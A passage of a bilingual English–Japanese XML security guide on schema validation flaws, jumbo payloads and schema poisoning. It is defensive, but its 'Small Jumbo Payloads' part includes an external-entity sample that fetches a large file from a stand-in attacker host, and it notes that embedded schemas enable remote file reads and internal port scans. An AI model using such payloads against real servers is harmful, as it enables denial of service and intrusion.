<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

この定義の後に、整形式かつ有効な XML 文書が始まります。`name` 要素には重要でない値が含まれていますが、`age` 要素には 100 万桁の数字が含まれています。`age` 要素の最大サイズに制約がないため、この 100 万桁の文字列をこの要素としてサーバーに送信できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

通常、この種の要素は、一定数以下の文字を含むよう制限し、特定の文字セット (たとえば 0 から 9 の数字、プラス記号、マイナス記号) に制約すべきです。適切に制限されていない場合、アプリケーションは文書内に含まれる潜在的に無効な値を扱う可能性があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Since it is not possible to indicate specific restrictions (a maximum length for the element `name` or a valid range for the element `age`), this type of schema increases the risk of affecting the integrity and availability of resources.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

特定の制約 (`name` 要素の最大長や `age` 要素の有効範囲など) を示せないため、この種のスキーマはリソースの完全性と可用性に影響するリスクを高めます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Improper Data Validation

**When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 不適切なデータ検証

**スキーマが安全でない形で定義され、厳格な規則を提供しない場合、アプリケーションをさまざまな状況にさらす可能性があります。その結果、内部エラーの開示や、予期しない値によってアプリケーション機能に影響する文書が発生する可能性があります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### String Data Types

Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 文字列データ型

16 進値を使用する必要がある場合、その値を文字列として定義し、後で特定の 16 個の 16 進文字に制限する意味はありません。このシナリオを例示すると、XML 暗号化を使用する場合、一部の値は base64 でエンコードする必要があります。これらの値がどのように見えるべきかを示すスキーマ定義は次のとおりです。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<element name="CipherData" type="xenc:CipherDataType"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="CipherValue" type="base64Binary"/>
   <element ref="xenc:CipherReference"/>
  </choice>
 </complexType>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The previous schema defines the element `CipherValue` as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述のスキーマは、`CipherValue` 要素を base64 データ型として定義しています。一例として、IBM WebSphere DataPower SOA Appliance は、有効な base64 値の後にこの要素内で任意の種類の文字を許可し、それを有効と見なしていました。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the `CipherData` element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

このデータの最初の部分は base64 値として適切にチェックされますが、残りの文字はほかの任意のものになり得ます (`CipherData` 要素の別のサブ要素を含む)。要素に対する制約が部分的にしか設定されていないため、情報は提案されたサンプルスキーマではなく、アプリケーションを使ってテストされている可能性があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Numeric Data Types

**Defining the correct data type for numbers can be more complex since there are more options than there are for strings.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 数値データ型

**数値には文字列より多くの選択肢があるため、正しいデータ型を定義することはより複雑になる可能性があります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Negative and Positive Restrictions

XML Schema numeric data types can include different ranges of numbers. They can include:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 負数と正数の制約

XML Schema の数値データ型には、さまざまな数値範囲を含められます。次のものがあります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

- **negativeInteger**: Only negative numbers
- **nonNegativeInteger**: Positive numbers and the zero value
- **positiveInteger**: Only positive numbers
- **nonPositiveInteger**: Negative numbers and the zero value

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- **negativeInteger**: 負数のみ
- **nonNegativeInteger**: 正数とゼロ値
- **positiveInteger**: 正数のみ
- **nonPositiveInteger**: 負数とゼロ値

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The following sample document defines an `id` for a product, a `price`, and a `quantity` value that is under the control of an attacker:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

次のサンプル文書は、商品の `id`、`price`、および攻撃者の制御下にある `quantity` 値を定義しています。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**過去の誤りを繰り返さないために、攻撃者が追加要素を導入しようとする場合に不正な構造の処理を防ぐ XML スキーマを定義できます。**

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Limiting that `quantity` to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing `price*quantity`. **However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`quantity` を整数データ型に制限すると、予期しない文字を避けられます。アプリケーションが前述のメッセージを受信すると、`price*quantity` を計算して最終価格を求める可能性があります。**しかし、このデータ型は負の値を許容する可能性があるため、攻撃者が負数を提供するとユーザーアカウントに負の結果を許す可能性があります。この論理的脆弱性を避けるためにここでおそらく必要なのは、integer ではなく positiveInteger です。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Divide by Zero

**Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error `FOAR0001` will occur. Other applications may throw other exceptions and the program may crash.** There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type `positiveInteger` for the element.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### ゼロ除算

**ユーザー制御値を除算の分母として使用する場合、開発者はゼロを許可しないようにすべきです。XSLT で値ゼロが除算に使用されると、エラー `FOAR0001` が発生します。ほかのアプリケーションでは別の例外が投げられ、プログラムがクラッシュする可能性があります。** XML スキーマには、ゼロ値の使用を明確に避ける特定のデータ型があります。たとえば、負の値とゼロが有効でない場合、スキーマはその要素に `positiveInteger` データ型を指定できます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The element `denominator` is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`denominator` 要素は正の整数に制限されます。これは、ゼロより大きい値だけが有効と見なされることを意味します。他の種類の制約が使用されている場合、分母がゼロであればエラーを引き起こす可能性があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Special Values: Infinity and Not a Number (NaN)

The data types `float` and `double` contain real numbers and some special values: `-Infinity` or `-INF`, `NaN`, and `+Infinity` or `INF`. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 特殊値: Infinity と Not a Number (NaN)

`float` と `double` データ型には、実数といくつかの特殊値、つまり `-Infinity` または `-INF`、`NaN`、`+Infinity` または `INF` が含まれます。これらの可能性は特定の値を表すのに便利な場合がありますが、誤用されることもあります。問題は、これらが価格などの実数だけを表すためによく使われる点です。これは、これらの技術だけに限定されず、ほかのプログラミング言語でも見られる一般的な誤りです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Not considering the whole spectrum of possible values for a data type could make underlying applications fail. **If the special values `Infinity` and `NaN` are not required and only real numbers are expected, the data type `decimal` is recommended:**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

データ型で取り得る値の全体像を考慮しないと、基盤アプリケーションが失敗する可能性があります。**特殊値 `Infinity` と `NaN` が不要で、実数だけが期待される場合は、データ型 `decimal` が推奨されます。**

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**価格値を Infinity または NaN に設定しても、それらの値は有効ではないため、エラーは引き起こされません。これらの値が許可されている場合、攻撃者はこの問題を悪用できます。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### General Data Restrictions

After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 一般的なデータ制約

適切なデータ型を選択した後、開発者は追加の制約を適用できます。データ型内の特定の値のサブセットだけが有効と見なされる場合があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Prefixed Values

**Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called `enumeration` in an XML schema.** The following example restricts the contents of the element month to 12 possible values:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 接頭辞付きの値

**一部の種類の値は特定の集合だけに制限すべきです。信号機には三種類の色しかなく、利用可能な月は 12 個だけ、というようなものです。スキーマが各要素または属性についてこれらの制約を備えている可能性があります。これはアプリケーションにとって最も完全な許可リストのシナリオです。特定の値だけが受け入れられます。このような制約は XML スキーマでは `enumeration` と呼ばれます。** 次の例は、month 要素の内容を 12 個の可能な値に制限します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

month 要素の値を前述のいずれかの値に制限することで、アプリケーションはランダムな文字列を操作しなくなります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Ranges

Software applications, databases, and programming languages normally store information within specific ranges. **Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid.** The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 範囲

ソフトウェアアプリケーション、データベース、プログラミング言語は通常、特定の範囲内に情報を格納します。**特定のサイズが重要な場所で要素または属性を使用する場合 (オーバーフローまたはアンダーフローを避けるため)、データ長が有効と見なされるかどうかをチェックするのは合理的です。** 次のスキーマは、異常なシナリオを避けるため、名前を最小長と最大長で制約できます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

可能な値が特定の長さ (たとえば 8) に制限される場合、有効にするために次のようにこの値を指定できます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Patterns

Certain elements or attributes may follow a specific syntax. You can add `pattern` restrictions when using XML schemas. **When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific `pattern`:**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### パターン

一部の要素または属性は特定の構文に従うことがあります。XML スキーマを使用する場合、`pattern` 制約を追加できます。**データが特定のパターンに準拠していることを保証したい場合、そのための特定の定義を作成できます。社会保障番号 (SSN) は良い例です。SSN は特定の文字セット、特定の長さ、特定の `pattern` を使用しなければなりません。**

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Only numbers between `000-00-0000` and `999-99-9999` will be allowed as values for a SSN.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

SSN の値としては、`000-00-0000` から `999-99-9999` までの数字だけが許可されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Assertions

**Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable `$value` can be used to reference the contents of the value being analyzed.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### アサーション

**アサーションコンポーネントは、XML スキーマ上の関連要素と属性の存在および値を制約します。要素または属性は、テストがエラーを発生させずに true と評価された場合にのみ、アサーションに関して有効と見なされます。変数 `$value` を使用して、分析対象の値の内容を参照できます。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The *Divide by Zero* section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an `assertion` disallowing the number zero:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述の *ゼロ除算* セクションでは、分母にゼロ値を含むデータ型を使用した場合の潜在的な結果を参照し、正の値だけを含むデータ型を提案しました。逆の例として、ゼロを除く数値範囲全体を有効と見なすことが考えられます。潜在的なエラーの開示を避けるため、ゼロを許可しない `assertion` を使用して値をチェックできます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The assertion guarantees that the `denominator` will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

このアサーションは、`denominator` が有効な数値として値ゼロを含まないことを保証し、同時に負数を有効な分母として許可します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Occurrences

**The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed.** Two attributes specify minimum and maximum limits: `minOccurs` and `maxOccurs`.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 出現回数

**最大出現回数を定義しないことの結果は、処理対象アイテムの極端な数を受け取った場合に起こり得る結果に対処するよりも悪くなる可能性があります。** 最小制限と最大制限を指定する二つの属性は、`minOccurs` と `maxOccurs` です。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The default value for both the `minOccurs` and the `maxOccurs` attributes is `1`, but certain elements may require other values. For instance, if a value is optional, it could contain a `minOccurs` of 0, and if there is no limit on the maximum amount, it could contain a `maxOccurs` of `unbounded`, as in the following example:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`minOccurs` と `maxOccurs` の両方のデフォルト値は `1` ですが、一部の要素には別の値が必要になることがあります。たとえば、値が任意である場合は `minOccurs` に 0 を含められ、最大数に制限がない場合は、次の例のように `maxOccurs` に `unbounded` を含められます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The previous schema includes a root element named `operation`, which can contain an unlimited (`unbounded`) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. **Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an `unbounded` value.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述のスキーマには `operation` という名前のルート要素が含まれ、その中に無制限 (`unbounded`) の buy 要素を含められます。開発者は通常、出現回数の最大値を制限したがらないため、これは一般的な所見です。**無制限の出現回数を使用するアプリケーションは、処理対象となる非常に大量の要素を受信した場合に何が起こるかをテストすべきです。計算リソースは有限であるため、結果を分析し、最終的には `unbounded` 値ではなく最大数を使用すべきです。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Jumbo Payloads

**Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### ジャンボペイロード

**1GB の XML 文書を送信してもサーバー処理は 1 秒しか必要とせず、攻撃として検討する価値がない場合があります。その代わり、攻撃者はこの種の攻撃を生成するために使用する CPU とトラフィックを、サーバーがリクエストを処理するために使用する総 CPU またはトラフィック量と比べて最小化する方法を探します。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Traditional Jumbo Payloads

**There are two primary methods to make a document larger than normal:**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 従来型ジャンボペイロード

**文書を通常より大きくする主な方法は二つあります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**- Depth attack: using a huge number of elements, element names, and/or element values.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**- 深さ攻撃: 大量の要素、要素名、要素値を使用します。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**- Width attack: using a huge number of attributes, attribute names, and/or attribute values.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**- 幅攻撃: 大量の属性、属性名、属性値を使用します。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

In most cases, the overall result will be a huge document. This is a short example of what this looks like:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ほとんどの場合、全体として巨大な文書になります。これはどのように見えるかを示す短い例です。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### "Small" Jumbo Payloads

**The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads.** The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 「小さな」ジャンボペイロード

**次の例は非常に小さな文書ですが、これを処理した結果は従来型ジャンボペイロードを処理した場合と似たものになる可能性があります。** このような小さなペイロードの目的は、攻撃者が十分な速さで多数の文書を送信し、アプリケーションに利用可能なリソースの大部分またはすべてを消費させられるようにすることです。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Schema Poisoning

**When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) (e.g., file retrieval, denial of service).** An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### スキーマポイズニング

**攻撃者がスキーマに変更を導入できる場合、複数の高リスクな結果が生じる可能性があります。特に、スキーマが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用している場合、その結果の影響はより危険になります (例: ファイル取得、サービス拒否)。** 攻撃者は、常にスキーマの場所に依存しながら、多数のシナリオでこの種の脆弱性を悪用できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Local Schema Poisoning

**Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### ローカルスキーマポイズニング

**ローカルスキーマポイズニングは、スキーマが同じホスト上で利用可能な場合に発生します。そのスキーマが同じ XML 文書に埋め込まれているかどうかは問いません。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Embedded Schema

**The most trivial type of schema poisoning takes place when the schema is defined within the same XML document.** Consider the following, unknowingly vulnerable example provided by the W3C :

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 埋め込みスキーマ

**最も単純なスキーマポイズニングは、スキーマが同じ XML 文書内に定義されている場合に発生します。** W3C が提供した、意図せず脆弱な次の例を考えてください。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. **This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

note 要素に対するすべての制約を削除または変更でき、任意の種類のデータをサーバーに送信できるようになります。さらに、サーバーが外部エンティティを処理している場合、攻撃者はスキーマを使って、たとえばサーバーからリモートファイルを読み取ることができます。**この種のスキーマは文書送信用の提案としてしか機能しないため、安全に使用するには埋め込みスキーマの整合性をチェックする方法を含めなければなりません。埋め込みスキーマを通じた攻撃は、外部エンティティ展開の悪用によく使われます。埋め込み XML スキーマは、内部ホストのポートスキャンやブルートフォース攻撃にも役立つ可能性があります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Incorrect Permissions

**You can often circumvent the risk of using remotely tampered versions by processing a local schema.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 不適切な権限

**ローカルスキーマを処理することで、リモートで改ざんされたバージョンを使用するリスクを回避できることがよくあります。**

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE note SYSTEM "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

